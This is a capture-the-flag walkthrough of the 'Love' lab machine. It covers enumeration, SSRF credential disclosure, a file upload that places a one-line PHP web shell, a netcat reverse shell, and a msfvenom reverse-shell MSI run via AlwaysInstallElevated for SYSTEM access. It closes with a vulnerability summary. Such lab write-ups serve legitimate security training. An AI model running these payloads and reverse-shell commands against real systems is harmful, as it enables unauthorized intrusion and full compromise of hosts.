---
title: 'Love Machine Walkthrough'
keywords: []
layout: single
header:
  image: /assets/images/love.png
toc: true
toc_label: "Table of Contents"
sidebar:
  nav: "sidebar"
---

![Machine exploitation matrix](/Pen-testing-blog/assets/images/1__NTX__xdKE5hLRK9Zyw5ECig.png "Figure 1 - Machine exploitation matrix")

## Machine Summary

Love is a relatively straightforward machine running the Windows operating system (OS) and shows how server side request forgery, unrestricted file uploads and broken access control vulnerabilities combined, can lead to the total compromise of a web application. A summary of the attack path is as follows:

* As a result of a [server-side request forgery vulnerabiliity](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery), I was able to force the web application server to make an outbound call to my Kali Linux machine that revealed the ADMIN user credentials for web application.
* As a result of a [unrestricted file upload vulnerability](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) in the web application, I was able to upload a reverse shell which initiated a connection back to my Kali Linux machine as the normal user, Phoebe.
* As a result of broken access control vulnerability in which all users were allowed to install Windows installer (MSI packages), I installed a malicious MSI package containing a reverse shell payload that once executed, elevated my access privileges to NT Authority\System.

## Step 1 — Enumeration

As always, I begin by enumerating the victim’s machine to obtain as much as information about it as I can such as the running OS, the OS version, any open ports, services running on those open ports and what applications are hosted by the running services. I will use the **Nmap** web scanner.

### Enumeration with Nmap

I first run a scan to discover open ports and then run the default set of nmap enumeration scripts and service detection scan only on those open ports for greater efficiency. Explanation of flags:

* \-p — Ports on victim machine to scan
* \-n — Do not resolve DNS
* \-sC — run default set of nmap enumeration scripts
* \-sV — Detect services running on the open ports
* \-T4 — Scan in aggressive mode to speed up the scan results

```bash
nmap 10.10.10.239 -p 80,135,139,443,445,3306,5000,5040,5985\-5986,7680,47001, 49664\-49670 -n -sC sV -T4
```

![Nmap scan output 1](/Pen-testing-blog/assets/images/1__N9zudSMxSFdG8HAMHwHndw.png "Figure 2 - Nmap scan output 1")

The (snipped) nmap output reveals the below for which I will manually enumerate further:

* Web servers running http protocol on Apache httpd web server version 2.4.46 with PHP server-side scripting language version 7.3.27 are active on default port 80 and also on port 5000.
* A web server running encrypted https protocol on Apache httpd server version 2.4.46 with PHP server-side scripting language version 7.3.27 is active on port default port 443.
* MySQL database service is running on default port 3306.
* Server messaging block (SMB) protocol for file share is running on default port 445 and also on port 139 using the NetBios service.
* Microsoft remote procedure call (RPC) on is running on port 135.
* An unknown service is running on port 5040
* The SSL certificate shows a subdomain of **staging.love.htb** which I will add to my hosts file along with the parent domain of **love.htb** at **/etc/hosts.** per Figure 3 below.

```bash
echo "10.10.10.239 love.htb" | sudo tee -a /etc/hosts  
echo "10.10.10.239 staging.love.htb" | sudo tee -a /etc/hosts
```

![Resolving IP address to host URL](/Pen-testing-blog/assets/images/1__MkCGxzd9ew7D19jwy15Ujw.png "Figure 3 - Resolving IP address to host URL")

### Enumeration of SMB file shares on ports 139 and 445

I attempt to enumerate the SMB file shares running on ports 139 and 445 but receive an access denied error per Figure 4 below. Explanation of flags:

* \-N — Log in without a password
* \-L — List all shares on the file share
* \-p — ports to use

```bash
smbclient -p 139,445 -N -L //10.10.10.239
```

![SMB login status failure](/Pen-testing-blog/assets/images/1____tCbPWjndMdUBZkXt9Gr4A.png "Figure 4 - SMB null authentication failure")

### Enumeration of MySQL database on port 3306

I attempt to login to the MariaDB / MySQL database on port 3306 but am unable to login from the IP address of my Kali Linux machine per Figure 5 below. Explanation of flags:

* \-h — Specify the IP address of the host machine to log in to

```bash
mysql -h 10.10.10.239
```

![MySQL login failure](/Pen-testing-blog/assets/images/1__XjansmbBOYNYLpztzjnpUw.png "Figure 5 - MySQL login failure")

### Enumeration of unknown service on port 5040

I attempt to enumerate the unknown service running on port 5040 via sending a cURL command to domain love.htb on port 5040, but per Figure 6 below, receive no response from server with the command just hanging in the terminal.

![Failure to enumerate unknown service via cURL request](/Pen-testing-blog/assets/images/1__uhrgRwyx0pjdxPQ3DP96WQ.png "Figure 6 - Failure to enumerate unknown service via client URL or cURL request")

### Enumeration of web servers on ports 80, 443, and 5000

I visit the domain love.htb on each of the ports listed above. For **http://love.htb:80,** I get a login page as shown in Figure 7 below. I tried the following techniques to bruteforce login credentials and all failed:

* Test for common default user ID / passwords in use (admin / admin etc.)
* Attempt to enumerate valid users via observation of different error messages shown when valid and invalid users IDs are entered
* SQL injection

For [**http://love.htb:5000**](http://love.htb:5000,) and [**https://love.htb:443**,](https://love.htb:443,) I get a Forbidden — Access denied error for both access methods as shown in Figure 8 and Figure 9 respectively.

![Unable to login to application over at love.htb over port 80](/Pen-testing-blog/assets/images/1__eFCdg7W5DIN2mjH89EGekw.png "Figure 7 - Unable to login to application at site love.htb over port 80")

![Access forbidden error when logging in to application love.htb over port 443](/Pen-testing-blog/assets/images/1__TsejWtOt3VHcxJx__v7uRqg.png "Figure 8 - Access forbidden error when logging in to application at site love.htb over port 443")

![Access forbidden error when logging in to application love.htb over port 5000](/Pen-testing-blog/assets/images/1__TzVyJuRz4XBQmnH__UA__t2w.png "Figure 9 - Access forbidden error when logging in to application love.htb over port 5000")

However, when I visit [http://staging.love.htb](http://staging.love.htb:80) over port 80, I am presented with an online file scanner as shown in Figure 10. If I click on the **Demo** button, I get a page that asks for an URL to scan.

![Access to file scanner on staging.love.htb over port 80](/Pen-testing-blog/assets/images/1__CXE05a5a__idLgpgpMtL1__w.png "Figure 10 - Access to file scanner on subdomain staging.love.htb over port 80")

### Enumeration of hidden directories using GoBuster

Before I explore the functionality of the file scanner, I complete the enumeration step by fuzzing for hidden directories using the web application fuzzing tool of GoBuster, although you can use other fuzzing tools such as ffuf, dirb , dirbuster, FeroxBuster etc. Explanation of flags is below. The scan found the hidden directories of /admin , /Admin. and /ADMIN that look very promising.

* \-u — Specify the IP address of host to scan
* \-w — Specify the path to wordlist on local attacking machine
* \-s — Filter for successful response codes only (200, 201,203, 301, 302 etc.)
* \-b — Disable negative status filtering by passing an empty string value

```bash
gobuster -u http://love.htb:80 -w /usr/share/wordlists/dirb/common.txt -s 200,201,203,301,302 -b ''
```

![Output of the hidden directories enumeration using Gobuster tool](/Pen-testing-blog/assets/images/1__Zv8qn4MzZbtX__jwUa29u9g.png "Figure 11 - enumeration of hidden directories using GoBuster tool")

## Step 2 — Gaining initial foothold -  Access to administration interface as Administrator user via exploitation of server side request forgery vulnerability (SSRF)

### Exploitation of service side request forgery (SSRF) vulnerability

As the enumeration phase of a penetration testing is complete, I need to find some method to gain initial access to the box. During enumeration step, I could not access [**http://love.htb:5000**](http://love.htb:5000) over port 5000 but could access the URL over default port 80 for a web server. I suspected perhaps there were access rules denying access for application traffic over this port coming from outside the web server.

To test my hypothesis, I put in IP instance of my Kali Linux instance and set up a net cat listener to test if I get an outbound  connection from Love.htb with IP address of **10.10.10.239.** to my Kali Linux machine.  I receive an inbound connection on my net cat listener per Figure 12, confirming the web server is vulnerable to SSRF.

![Outbound connection to my Kali machine from Love.htb](/Pen-testing-blog/assets/images/1__BSPxDVzHarag__A2DwTNTTg.png "Figure 12 - Allowance of outbound connection from staging.love.htb to my Kali Linux machine")

Most likely, this means I can force the server to make a request on my behalf and access internal resources from itself using its loopback address at [**http://127.0.0.1.**](http://127.0.0.1.) During enumeration I could not access [**http://love.htb:5000**](http://love.htb:5000) externally, but perhaps I can use SSRF to bypass the access controls. I successfully exploit SSRF vulnerability as the Burpsuite output in Figure 13 below shows how making a request to the application server with the parameter **file** having a value of [http://127.0.0.1:5000](http://127.0.0.1:5000) results in the server response disclosing the password.

![Successful exploitation of SSRF vulnerability](/Pen-testing-blog/assets/images/1__d69GIRwqO66Wpd0SM8nIHg.png "Figure 13 - Successful exploitation of SSRF vulnerabilitity")

## Step 3 - Lateral movement to user Phoebe - remote code execution (RCE) due to exploitation of uncontrolled file uploads vulnerability

### Confirming remote code execution (RCE) on server

I attempt to log in to the voting system as the administrator at [http://love.htb/admin](http://love.htb/admin) using **admin** as the user ID and the password I just obtained as the password and was successful, evidenced via a temporary redirect response code of 302 from the server as shown in Figure 14.

![Successfully logged on to victim computer](/Pen-testing-blog/assets/images/Successful login to administration interface_Love.png "Figure 14 - Successfully logged into Web application administration interface on victim computer")

After logging in successfully as the administrative user, I am presented with the voting system dashboard and discover it is possible to upload a custom picture for administrative user profile. Immediately, I suspect there might be an arbitrary file upload vulnerability that can grant remote code execution (RCE). I test for RCE by writing a simple snippet of PHP code to create a web shell (**webshell.php**), uploading as an image file, and passing in the test command, **whoami** as the value of the cmd parameter. The test was successful, returning the login ID of currently logged in user, thus confirming I have RCE on the web server.

```bash
<?php system($\_REQUEST\["cmd"\]);
```

![](/Pen-testing-blog/assets/images/1__pNPNKfok__iy__baDT5mymHw.png)

### Establishing reverse shell connection as Phoebe — Using netcat with -e switch

The next step after confirming RCE is to obtain a reverse shell on the system to gain the initial foothold. First, I upload the **nc.exe** executable file to the web server via exploiting the arbitrary file upload vulnerability as shown above.

![](/Pen-testing-blog/assets/images/1__p1TMDNstoYnYYj9FLAUM7g.png)

Next, I set up a net cat listener on my Kali Linux instance as the attacking machine to catch the reverse shell upon it being created in the next step. Explanation of flags:

*   \-l — Set net cat to listening mode
*   \-v — Enable verbose output for greater information
*   \-n — Do not resolve DNS
*   \-p port to listen on (can be any open port)

![](/Pen-testing-blog/assets/images/1__mKnbg9FIfqw0SmBbZSvFsQ.png)

I remove **whoami** as the value of the **cmd** parameter passed in **webshell.php** site with the below command to have the victim’s machine initiate an outbound connection to my machine and trigger the command prompt to run after connection has been established. The reverse shell connection is successful, and I gain access to victim’s machine as user **love\\Phoebe**. Explanation of syntax:

*   10.10.14.36 — IP address of my Kali Linux instance
*   4444 — Port to connect to (must match port netcat is listening on)
*   \-e — Specify a file to run upon establishing a connection
*   cmd.exe — Specify the command prompt as value to the -e flag

cmd=nc+10.10.14.36+4444+-e+cmd.exe

![](/Pen-testing-blog/assets/images/1__V97ViX7oVCLnrgIfkATJtQ.png)

## Step 4 — Privilege escalation from Phoebe to NT Authority\System

The final step after gaining access as user Phoebe is to elevate my access to the root user as **NT Authority\\System**. I will be using the **WinPeas** privilege escalation scanning scripts which will enumerate the various ways my access privileges can be escalated. The scripts can either be downloaded from the [official GitHub repository](https://github.com/peass-ng/PEASS-ng) or via the native Kali Linux apt package manager using [sudo apt install peass](https://www.kali.org/tools/peass-ng/).

Before I run WinPeas, I always like to run the **systeminfo** command to get some basic information on the victim’s machine such as any patches applied and the architecture of the operating system. Output of this command is show below.

![](/Pen-testing-blog/assets/images/1__r9C7q5RyDmWpj9STDo2LKw.png)

### Privilege escalation enumeration with WinPeas application

I transfer the version of WinPeas executable file that matches the OS architecture on the victim’s machine from my Kali Linux instance to the victim’s machine by hosting it on a Python web server and then fetching it from victim’s machine using the curl command.

![](/Pen-testing-blog/assets/images/1__IVElxJiZmm5bnLbSWwynzg.png)
![](/Pen-testing-blog/assets/images/1__rAduNmp2dZLsEQEq7Eu1Nw.png)

After running the winpeas64.exe script, I find out that the setting [**AlwaysInstallElevated** is enabled](https://learn.microsoft.com/en-us/windows/win32/msi/installing-a-package-with-elevated-privileges-for-a-non-admin) which enables any user to install Microsoft installer packages (.msi files) with elevated administrator privileges. All I have to do is create a malicious msi file and execute it on the victim’s machine.

![](/Pen-testing-blog/assets/images/1__VYVqjJbCKZvsN__38ERSXTA.png)

### Exploitation of security misconfiguration to obtain root user

I will create the malicious payload using msfvenom. The configuration of the payload must match the configuration of the victim’s machine as shown by the **systeminfo** command output. Explanation of flags:

*   \-a — Specify the architecture — Choose x64
*   — Platforms — Specify the OS — Choose Windows
*   \-p — Specify the payload — Choose x64 stageless reverse shell over TCP
*   LHOST — Specify IP address of my Kali Linux attacking machine
*   LPORT — Specify port to use (can be any open port)
*   \-f — Specify payload format — choose msi
*   \-o — Specify output file name

msfvenom -a x64 --platform windows -p windows/x64/shell\_reverse\_tcp LHOST=10.10.14.36 LPORT=4445 -f msi -o reverseshell.msi

After transferring the malicious file to the victim’s machine via the Python server I previously set up, I execute the payload using the **msiexec** tool. Explanation of flags:

*   /quiet — specify install in quiet mode to not require user interaction
*   /qn — Suppress all user interfaces during installation process
*   /i — Install in normal user mode

msiexec /quiet /qn /i reverseshell.msi

After the malicious msi file is successfully installed, the malicious reverse shell payload executes, granting me access as **NT Authority\\System.**

![](/Pen-testing-blog/assets/images/1__cLaINZoE4o2zMmu3gkzbfg.png)

### Vulnerability Summary

This machine contained the following vulnerabilities:

*   **Server-side request forgery** — As a result of not limiting server requests to only trusted endpoints, I was able to force the server to connect to my Kali Linux instance on my behalf and by not filtering localhost or http://127.0.0.1 from permitted input in user supplied URL, I was able to force the server to send a request to itself via its loopback address and thereby access sensitive , internal only resources without authentication.
*   **Arbitrary file upload** — As a result of no filtering in place for either file type, file content, or file extensions for files being uploaded to the images directory on the web server, I was able upload a malicious payload in form of a web shell in lieu of a legitimate image file type such as jpeg or png.
*   **Security misconfiguration** - As a result of the AlwayInstallElevated registry value being enabled (registry keys set to 1), I was able to install msi files as a non — administrative user.
